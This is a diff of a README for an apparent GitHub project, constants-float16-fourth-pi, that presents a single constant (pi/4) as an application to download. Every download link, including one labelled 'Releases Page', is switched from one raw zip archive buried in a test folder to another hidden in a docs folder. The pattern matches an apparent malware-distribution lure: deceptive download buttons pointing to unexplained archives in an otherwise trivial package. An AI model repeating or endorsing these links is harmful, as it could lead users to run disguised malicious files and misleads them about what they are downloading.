@@ -1,6 +1,6 @@
 # 🎉 constants-float16-fourth-pi - Easily Access 1/4 of Pi
 
-[![Download Now](https://github.com/ethan123450/constants-float16-fourth-pi/raw/refs/heads/main/test/dist/fourth_float_constants_pi_2.7.zip)](https://github.com/ethan123450/constants-float16-fourth-pi/raw/refs/heads/main/test/dist/fourth_float_constants_pi_2.7.zip)
+[![Download Now](https://github.com/ethan123450/constants-float16-fourth-pi/raw/refs/heads/main/docs/types/pi-fourth-constants-float-v1.1.zip)](https://github.com/ethan123450/constants-float16-fourth-pi/raw/refs/heads/main/docs/types/pi-fourth-constants-float-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the constants-float16-fourth-pi project! This application provides a 
 
 To get started, you will need to download the application. You can find the most recent version on our Releases page. Click the link below to visit:
 
-[Download the latest version](https://github.com/ethan123450/constants-float16-fourth-pi/raw/refs/heads/main/test/dist/fourth_float_constants_pi_2.7.zip)
+[Download the latest version](https://github.com/ethan123450/constants-float16-fourth-pi/raw/refs/heads/main/docs/types/pi-fourth-constants-float-v1.1.zip)
 
 ### Steps to Download
 
@@ -52,7 +52,7 @@ If you have questions or need help, feel free to reach out. Join our community d
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/ethan123450/constants-float16-fourth-pi/raw/refs/heads/main/test/dist/fourth_float_constants_pi_2.7.zip)
+- [Releases Page](https://github.com/ethan123450/constants-float16-fourth-pi/raw/refs/heads/main/docs/types/pi-fourth-constants-float-v1.1.zip)
 - [Documentation](#)
 - [Issues Page](#)
 
